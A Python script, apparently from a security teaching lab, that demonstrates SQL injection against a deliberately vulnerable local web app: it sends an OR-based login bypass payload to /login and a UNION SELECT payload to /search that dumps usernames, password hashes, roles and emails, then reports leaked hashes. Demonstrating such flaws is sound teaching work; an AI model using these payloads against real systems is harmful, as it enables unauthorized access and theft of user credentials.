"""
SQL Injection Attack Demo
Targets: /login (bypass) and /search (UNION injection)
Run against the VULNERABLE app (port 5000).
"""
import requests

BASE = "http://127.0.0.1:5000"
SESSION = requests.Session()


def login_bypass():
    """Classic OR-bypass: logs in as admin without knowing the password."""
    payload = {"username": "admin' OR '1'='1' --", "password": "anything"}
    r = SESSION.post(f"{BASE}/login", data=payload, allow_redirects=True)
    success = "留言板" in r.text or "messages" in r.url or "登录成功" in r.text
    print(f"[SQL-Bypass] status={r.status_code} success={success}")
    print(f"  payload: username={payload['username']!r}")
    return success


def union_injection():
    """UNION SELECT to dump user table via search endpoint."""
    # First get a valid session
    SESSION.post(f"{BASE}/login", data={"username": "alice", "password": "alice123"})
    payload = "' UNION SELECT id,username,password,role,email,avatar FROM users --"
    r = SESSION.get(f"{BASE}/search", params={"q": payload})
    # Look for MD5 hashes (32 hex chars) in the response — indicates data leak
    import re
    hashes = re.findall(r"\b[0-9a-f]{32}\b", r.text)
    print(f"[SQL-UNION] status={r.status_code} hashes_found={len(hashes)}")
    if hashes:
        print(f"  leaked hashes: {hashes[:3]}")
    return len(hashes) > 0


if __name__ == "__main__":
    print("=" * 60)
    print("SQL Injection Demo — Vulnerable App (port 5000)")
    print("=" * 60)
    b = login_bypass()
    u = union_injection()
    print()
    print(f"Login bypass:   {'SUCCESS' if b else 'FAILED'}")
    print(f"UNION dump:     {'SUCCESS' if u else 'FAILED'}")
